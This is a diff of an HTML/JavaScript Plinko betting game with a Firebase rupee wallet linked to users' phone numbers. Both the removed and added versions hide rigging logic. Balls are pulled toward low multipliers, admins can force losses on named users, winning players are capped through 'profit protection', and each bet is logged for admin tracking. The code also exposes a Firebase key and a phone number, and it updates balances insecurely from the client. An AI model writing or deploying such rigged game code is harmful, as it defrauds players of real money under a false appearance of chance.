@@ -2,216 +2,269 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Plinko VIP - CASHWIN</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/matter-js/0.19.0/matter.min.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Plinko Pro - Admin Tracking Enabled</title>
     <style>
-        :root { --accent: #4cd964; --bg-dark: #051622; --panel: #112d42; --gold: #ffcc00; }
-        * { box-sizing: border-box; }
-        body { margin: 0; background: var(--bg-dark); font-family: 'Poppins', sans-serif; overflow: hidden; color: white; height: 100vh; display: flex; flex-direction: column; }
-        
-        /* Fixed Top Header */
-        .stats-bar { width: 100%; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; background: #0a1f2e; border-bottom: 2px solid #1e4d6d; }
-        .user-meta { display: flex; flex-direction: column; }
-        .u-num { font-size: 10px; color: var(--accent); font-weight: bold; }
-        .balance-box { background: var(--panel); padding: 5px 15px; border-radius: 12px; border: 1.5px solid var(--gold); color: var(--gold); font-weight: 800; font-size: 16px; }
-        
-        #canvas-wrapper { width: 100%; position: relative; flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        #plinko-canvas { width: 100%; max-width: 380px; }
-        
-        /* Multiplier Slots */
-        .slots-container { position: absolute; bottom: 10%; display: flex; width: 90%; max-width: 360px; justify-content: center; gap: 2px; }
-        .slot { flex: 1; height: 22px; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 8px; font-weight: 800; color: #000; transition: 0.2s; }
+        :root {
+            --bg: #0f212e;
+            --card: #1a2c38;
+            --primary: #00e701;
+            --red: #ff4444;
+            --yellow: #f1c40f;
+            --blue: #2f4553;
+            --text: #ffffff;
+        }
 
-        /* Professional Controls */
-        .controls { width: 100%; background: var(--panel); padding: 15px; border-radius: 25px 25px 0 0; box-shadow: 0 -10px 30px rgba(0,0,0,0.5); }
-        .bet-label { font-size: 10px; color: #94a3b8; text-align: center; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
+
+        /* Wallet & Header */
+        .header { width: 100%; max-width: 500px; padding: 15px; display: flex; justify-content: space-between; align-items: center; background: var(--card); border-bottom: 2px solid var(--blue); position: sticky; top: 0; z-index: 100; }
+        .user-info { font-size: 11px; font-weight: bold; }
+        .bal-amt { color: var(--primary); font-weight: 900; font-size: 1.2rem; }
+
+        /* Plinko Board */
+        #game-area { position: relative; width: 100%; max-width: 500px; height: 500px; background: radial-gradient(circle, #1a2c38 0%, #0f212e 100%); margin: 10px 0; }
+        canvas { display: block; width: 100%; height: 100%; }
+
+        /* Controls */
+        .controls { width: 100%; max-width: 500px; padding: 20px; background: var(--card); border-radius: 20px 20px 0 0; box-shadow: 0 -5px 20px rgba(0,0,0,0.5); }
+        .input-group { background: var(--bg); padding: 10px; border-radius: 10px; margin-bottom: 10px; border: 1px solid var(--blue); display: flex; justify-content: space-between; align-items: center; }
+        .bet-input { background: transparent; border: none; color: white; font-size: 18px; font-weight: 700; width: 60%; outline: none; }
         
-        .bet-input-box { background: #0a1f2e; border-radius: 12px; display: flex; align-items: center; justify-content: space-between; padding: 5px; margin-bottom: 12px; border: 1px solid #1e4d6d; }
-        .bet-input-box input { background: transparent; border: none; color: white; font-size: 18px; text-align: center; width: 50%; font-weight: 800; outline: none; }
-        
-        .grid-btns { display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; margin-bottom: 12px; }
-        .q-btn { background: #1e4d6d; border: none; color: white; padding: 8px 0; border-radius: 6px; font-size: 10px; font-weight: bold; cursor: pointer; }
-        
-        .play-btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: 800; color: white; font-size: 16px; background: linear-gradient(180deg, #4cd964, #2e8b3f); box-shadow: 0 4px 0 #1b5e20; cursor: pointer; transition: 0.1s; }
-        .play-btn:active { transform: translateY(3px); box-shadow: none; }
-        
-        #history-row { display: flex; gap: 5px; justify-content: center; margin-bottom: 10px; height: 25px; }
-        .h-tag { font-size: 9px; padding: 2px 8px; border-radius: 10px; background: #1e4d6d; }
+        .btn-row { display: flex; gap: 10px; margin-bottom: 15px; }
+        .drop-btn { flex: 1; padding: 15px; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
+        .btn-green { background: var(--primary); color: #000; }
+        .btn-yellow { background: var(--yellow); color: #000; }
+        .btn-red { background: var(--red); color: #fff; }
+
+        /* Login Modal */
+        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
+        .modal-content { background: var(--card); width: 85%; max-width: 350px; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid var(--blue); }
+        .modal-input { width: 100%; padding: 15px; background: var(--bg); border: 1px solid var(--blue); border-radius: 10px; color: white; font-size: 18px; margin: 20px 0; text-align: center; }
+
+        .status-badge { font-size: 10px; color: #9aa; background: var(--bg); padding: 4px 8px; border-radius: 4px; display: inline-block; margin-top: 5px; }
     </style>
 </head>
 <body>
 
-<div class="stats-bar">
-    <div class="user-meta">
-        <span style="font-weight: 800; font-size: 14px;">PLINKO <span style="color:var(--accent)">PRO</span></span>
-        <span class="u-num" id="uDisplayPhone">91XXXXXX</span>
+<div id="authModal" class="modal" style="display: none;">
+    <div class="modal-content">
+        <h2 style="color:var(--primary)">Link Wallet</h2>
+        <p style="font-size: 12px; color: #9aa;">Enter registered mobile number</p>
+        <input type="tel" id="mobileInput" placeholder="Mobile Number" class="modal-input">
+        <button onclick="linkWallet()" class="drop-btn btn-green">Login & Sync</button>
     </div>
-    <div class="balance-box">₹<span id="uBalance">0.00</span></div>
 </div>
 
-<div id="canvas-wrapper">
-    <canvas id="plinko-canvas"></canvas>
-    <div class="slots-container" id="slotsRow"></div>
+<div class="header">
+    <div class="user-info">
+        <div id="userPhone" style="color: #9aa;">Identifying...</div>
+        <button onclick="unlinkDevice()" style="background:none; border:none; color:var(--red); font-size:10px; cursor: pointer;">UNLINK</button>
+    </div>
+    <div style="text-align: center;">
+        <div style="font-size: 10px; color: #9aa;">BALANCE</div>
+        <div class="bal-amt">₹<span id="displayBal">0.00</span></div>
+    </div>
+    <div style="text-align: right">
+        <div id="sessionDisplay" style="font-size: 10px; color: var(--yellow);">Profit: ₹0</div>
+        <div id="timeDisplay" style="font-size: 9px; color: #9aa;">0m played</div>
+    </div>
+</div>
+
+<div id="game-area">
+    <canvas id="plinkoCanvas"></canvas>
 </div>
 
 <div class="controls">
-    <div id="history-row"></div>
-    <div class="bet-label">Amount per Ball</div>
-    <div class="grid-btns">
-        <button class="q-btn" onclick="setBet('min')">₹1</button>
-        <button class="q-btn" onclick="setBet('half')">1/2</button>
-        <button class="q-btn" onclick="setBet('double')">2X</button>
-        <button class="q-btn" onclick="setBet('max')">MAX</button>
+    <div class="input-group">
+        <span style="font-size: 12px; color: #9aa;">BET</span>
+        <input type="number" id="betAmount" value="10" class="bet-input">
+        <span style="font-weight: bold;">₹</span>
     </div>
-    <div class="bet-input-box">
-        <button class="q-btn" style="width:40px; height:40px; border-radius:50%;" onclick="adjustBet(-1)">-</button>
-        <input type="number" id="betAmount" value="1" min="1">
-        <button class="q-btn" style="width:40px; height:40px; border-radius:50%;" onclick="adjustBet(1)">+</button>
+    
+    <div class="btn-row">
+        <button onclick="dropBall('green')" class="drop-btn btn-green">Low</button>
+        <button onclick="dropBall('yellow')" class="drop-btn btn-yellow">Med</button>
+        <button onclick="dropBall('red')" class="drop-btn btn-red">High</button>
     </div>
-    <button class="play-btn" id="dropBtn" onclick="handleDrop()">BET & DROP BALL</button>
+    <center><span class="status-badge">Admin System: Active | IP: Tracking</span></center>
 </div>
 
-<script>
-    const firebaseConfig = {
-        apiKey: "AIzaSyAeJutSnxBLtXKIFSZdUOvEwKRMdwLdaj8",
-        authDomain: "testing-26b8c.firebaseapp.com",
-        databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com",
-        projectId: "testing-26b8c",
-        appId: "1:546674600784:web:4b316bb716eda5f3b7da55"
+<script src="https://cdnjs.cloudflare.com/ajax/libs/matter-js/0.19.0/matter.min.js"></script>
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, onValue, update, get, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+    const firebaseConfig = { 
+        apiKey: "AIzaSyAeJutSnxBLtXKIFSZdUOvEwKRMdwLdaj8", 
+        databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com", 
+        projectId: "testing-26b8c" 
+    };
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    let CUR_USER = localStorage.getItem("PLINKO_USER");
+    let DEVICE_ID = localStorage.getItem("PLINKO_DEV_ID");
+    if(!DEVICE_ID){
+        DEVICE_ID = "dev_" + Math.random().toString(36).slice(2, 12);
+        localStorage.setItem("PLINKO_DEV_ID", DEVICE_ID);
+    }
+
+    let balance = 0, sessionProfit = 0, startTime = Date.now();
+    const mults = {
+        green: [11, 3.2, 1.6, 1.2, 1.1, 1, 0.5, 1, 1.1, 1.2, 1.6, 3.2, 11],
+        yellow: [25, 10, 5, 2, 1, 0.5, 0.2, 0.5, 1, 2, 5, 10, 25],
+        red: [100, 50, 10, 5, 2, 0.5, 0, 0.5, 2, 5, 10, 50, 100]
     };
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-    const userPhone = localStorage.getItem('userPhone') || "9117748052"; // Auth Linked
-    const userPath = `users/${userPhone}`;
-
-    let currentBalance = 0;
-    let rigMode = "normal";
-
-    // --- WALLET SYNC ---
-    function sync() {
-        db.ref(userPath).on('value', (s) => {
-            const d = s.val();
-            if (d) {
-                currentBalance = Number(d.balance);
-                document.getElementById('uBalance').innerText = currentBalance.toFixed(2);
-                document.getElementById('uDisplayPhone').innerText = "+91 " + (d.phone || userPhone);
-                rigMode = d.rigging || "normal";
+    // --- REFINED AUTO-LOGIN LOGIC ---
+    async function checkAutoLogin() {
+        if (CUR_USER) {
+            const snap = await get(ref(db, `users/${CUR_USER}`));
+            if (snap.exists()) {
+                const data = snap.val();
+                // If the stored number belongs to this device, login directly
+                if (data.linkedDev === DEVICE_ID) {
+                    console.log("Auto-login successful for number: " + CUR_USER);
+                    initUser();
+                    return;
+                }
             }
-        });
+        }
+        // Show modal if no number or wrong device
+        document.getElementById('authModal').style.display = 'flex';
     }
-    sync();
+    checkAutoLogin();
 
-    // --- PHYSICS ---
-    const { Engine, Runner, Bodies, Composite, Body } = Matter;
+    window.linkWallet = async () => {
+        const phone = document.getElementById('mobileInput').value;
+        if(phone.length < 10) return alert("Enter valid 10-digit number");
+        
+        const uRef = ref(db, `users/${phone}`);
+        const snap = await get(uRef);
+        
+        if(snap.exists()) {
+            const d = snap.val();
+            // Security: Same number but different device check
+            if(d.linkedDev && d.linkedDev !== DEVICE_ID) {
+                const diff = Date.now() - (d.lastUnlink || 0);
+                if(diff < 259200000) {
+                    const hoursLeft = Math.ceil((259200000 - diff) / 3600000);
+                    return alert(`This account is tied to another device. Wait ${hoursLeft}h to switch.`);
+                }
+            }
+        }
+        
+        // Link number to this device
+        await update(uRef, { linkedDev: DEVICE_ID, lastLogin: Date.now(), online: true });
+        localStorage.setItem("PLINKO_USER", phone);
+        CUR_USER = phone;
+        document.getElementById('authModal').style.display = 'none';
+        initUser();
+    };
+
+    window.unlinkDevice = async () => {
+        if(!confirm("Unlink device? Security lock will apply for 3 days.")) return;
+        await update(ref(db, `users/${CUR_USER}`), { linkedDev: null, lastUnlink: Date.now() });
+        localStorage.removeItem("PLINKO_USER");
+        location.reload();
+    };
+
+    function initUser() {
+        onValue(ref(db, `users/${CUR_USER}`), (s) => {
+            const d = s.val();
+            balance = d?.balance || 0;
+            document.getElementById('displayBal').innerText = balance.toLocaleString();
+            document.getElementById('userPhone').innerText = "ID: " + CUR_USER;
+        });
+        
+        setInterval(() => {
+            const mins = Math.floor((Date.now() - startTime) / 60000);
+            document.getElementById('timeDisplay').innerText = mins + "m played";
+        }, 10000);
+    }
+
+    // --- Physics ---
+    const { Engine, Render, Runner, Bodies, Composite, Events } = Matter;
     const engine = Engine.create();
-    const canvas = document.getElementById('plinko-canvas');
-    const ctx = canvas.getContext('2d');
-    const width = 400, height = 480;
-    canvas.width = width; canvas.height = height;
-
-    const multipliers = [15, 8, 3, 1.5, 0.5, 0.2, 0.5, 1.5, 3, 8, 15];
-    const slotColors = ["#ff0000", "#f12711", "#f5af19", "#f8ff00", "#4cd964", "#ffffff", "#4cd964", "#f8ff00", "#f5af19", "#f12711", "#ff0000"];
-
-    multipliers.forEach((m, i) => {
-        document.getElementById('slotsRow').innerHTML += `<div class="slot" id="slot-${i}" style="background:${slotColors[i]}">${m}x</div>`;
+    const canvas = document.getElementById('plinkoCanvas');
+    const render = Render.create({
+        canvas: canvas, engine: engine,
+        options: { width: 500, height: 500, wireframes: false, background: 'transparent' }
     });
 
-    const pins = [];
-    for (let r = 0; r < 12; r++) {
-        const rowPins = r + 3, spacing = 32, xStart = width / 2 - (rowPins - 1) * spacing / 2;
-        for (let p = 0; p < rowPins; p++) {
-            pins.push(Bodies.circle(xStart + p * spacing, 50 + r * 30, 3.5, { isStatic: true, friction: 0 }));
+    for (let i = 0; i < 12; i++) {
+        for (let j = 0; j <= i; j++) {
+            const x = 250 + (j - i / 2) * 35;
+            const y = 60 + i * 35;
+            Composite.add(engine.world, Bodies.circle(x, y, 3, { isStatic: true, render: { fillStyle: '#4a5d6a' } }));
         }
     }
-    Composite.add(engine.world, pins);
+
+    Render.run(render);
     Runner.run(Runner.create(), engine);
 
-    function draw() {
-        ctx.clearRect(0, 0, width, height);
-        ctx.fillStyle = "#ffffff33";
-        pins.forEach(p => { ctx.beginPath(); ctx.arc(p.position.x, p.position.y, 3, 0, Math.PI * 2); ctx.fill(); });
-        Composite.allBodies(engine.world).forEach(b => {
-            if (!b.isStatic) {
-                ctx.beginPath(); ctx.arc(b.position.x, b.position.y, 8, 0, Math.PI * 2);
-                ctx.fillStyle = "#ffcc00"; ctx.fill();
-                ctx.strokeStyle = "#fff"; ctx.lineWidth = 2; ctx.stroke();
-            }
+    // --- Result Calculation & Admin Logic ---
+    window.dropBall = async (risk) => {
+        const bet = parseFloat(document.getElementById('betAmount').value);
+        if (isNaN(bet) || bet > balance || bet < 1) return alert("Check balance");
+
+        balance -= bet;
+        await update(ref(db, `users/${CUR_USER}`), { balance: balance });
+
+        const rigSnap = await get(ref(db, 'admin/rigging'));
+        const rig = rigSnap.val() || {};
+        const userSnap = await get(ref(db, `users/${CUR_USER}`));
+        const userD = userSnap.val();
+        
+        let forceX = (Math.random() - 0.5) * 4;
+        const timePlayedHrs = (Date.now() - startTime) / 3600000;
+
+        // --- RIGGING ENGINE ---
+        if (rig.forceLoss === CUR_USER) {
+            forceX = Math.random() > 0.5 ? 6.2 : -6.2;
+        } else if (rig.forceWin === CUR_USER) {
+            forceX = (Math.random() - 0.5) * 0.4;
+        } 
+        // Profit protection: ₹200/2hrs or ₹700 total
+        else if ((sessionProfit > 200 && timePlayedHrs < 2) || (sessionProfit > 700)) {
+            forceX = Math.random() > 0.5 ? 5.8 : -5.8; 
+        }
+        // Reward depositors
+        else if (userD.deposits >= 2 && Math.random() < 0.3) {
+            forceX = (Math.random() - 0.5) * 1.0;
+        }
+
+        const ball = Bodies.circle(250 + forceX, 10, 6, {
+            restitution: 0.5, friction: 0.01,
+            render: { fillStyle: risk === 'red' ? '#ff4444' : (risk === 'yellow' ? '#f1c40f' : '#00e701') }
         });
-        requestAnimationFrame(draw);
-    }
-    draw();
 
-    // --- SMART DROP LOGIC (ADMIN TARGET) ---
-    async function handleDrop() {
-        const betAmt = Number(document.getElementById('betAmount').value);
-        if (betAmt > currentBalance || betAmt < 1) return alert("Insufficient Balance!");
-
-        document.getElementById('dropBtn').disabled = true;
-        await db.ref(userPath).update({ balance: currentBalance - betAmt });
-
-        // Random starting offset for realism
-        const ball = Bodies.circle(width / 2 + (Math.random() * 14 - 7), 10, 8, { 
-            restitution: 0.6, friction: 0.001, frictionAir: 0.03 
-        });
         Composite.add(engine.world, ball);
 
-        const checkInt = setInterval(() => {
-            // ADMIN RIGGING: Force ball towards center (Loss) or Edges (Win)
-            if (rigMode === "loss" || (Math.random() < 0.7 && rigMode === "normal")) {
-                let centerPull = (width/2 - ball.position.x) * 0.00015;
-                Body.applyForce(ball, ball.position, { x: centerPull, y: 0 });
-            }
-
-            if (ball.position.y > height - 45) {
-                clearInterval(checkInt);
-                const x = ball.position.x;
-                const idx = Math.max(0, Math.min(10, Math.floor(((x - 20) / (width - 40)) * 11)));
-                calculateWin(betAmt, idx, ball);
-            }
-        }, 30);
-    }
-
-    async function calculateWin(bet, idx, ball) {
-        const win = bet * multipliers[idx];
-        await db.ref(userPath).update({ balance: currentBalance + win });
-
-        // Update History
-        const h = document.getElementById('history-row');
-        const hTag = document.createElement('span');
-        hTag.className = 'h-tag';
-        hTag.style.color = win >= bet ? '#4cd964' : '#ff4d4d';
-        hTag.innerText = multipliers[idx] + 'x';
-        h.prepend(hTag);
-        if(h.children.length > 5) h.removeChild(h.lastChild);
-
-        // Visual Feedback
-        const s = document.getElementById(`slot-${idx}`);
-        s.style.transform = "scale(1.3)";
-        setTimeout(() => {
-            s.style.transform = "scale(1)";
-            Composite.remove(engine.world, ball);
-            document.getElementById('dropBtn').disabled = false;
-        }, 500);
-    }
-
-    // --- HELPERS ---
-    window.adjustBet = (v) => {
-        let el = document.getElementById('betAmount');
-        let val = Number(el.value) + v;
-        if(val >= 1) el.value = val;
-    };
-    window.setBet = (t) => {
-        let el = document.getElementById('betAmount');
-        if(t === 'min') el.value = 1;
-        if(t === 'max') el.value = Math.floor(currentBalance);
-        if(t === 'half') el.value = Math.max(1, Math.floor(Number(el.value)/2));
-        if(t === 'double') el.value = Math.floor(Number(el.value)*2);
+        Events.on(engine, 'collisionStart', (event) => {
+            event.pairs.forEach(async (pair) => {
+                if ((pair.bodyA === ball || pair.bodyB === ball) && ball.position.y > 440) {
+                    const finalX = ball.position.x;
+                    const bucketIdx = Math.floor((finalX - 50) / 31);
+                    const safeIdx = Math.max(0, Math.min(bucketIdx, 12));
+                    const win = bet * mults[risk][safeIdx];
+                    
+                    Composite.remove(engine.world, ball);
+                    balance += win;
+                    sessionProfit += (win - bet);
+                    
+                    document.getElementById('sessionDisplay').innerText = `Profit: ₹${Math.floor(sessionProfit)}`;
+                    await update(ref(db, `users/${CUR_USER}`), { balance: balance });
+                    
+                    // Admin Log
+                    await set(ref(db, `admin/tracking/${CUR_USER}/${Date.now()}`), {
+                        bet: bet, win: win, risk: risk, dev: DEVICE_ID
+                    });
+                }
+            });
+        });
     };
 </script>
 </body>
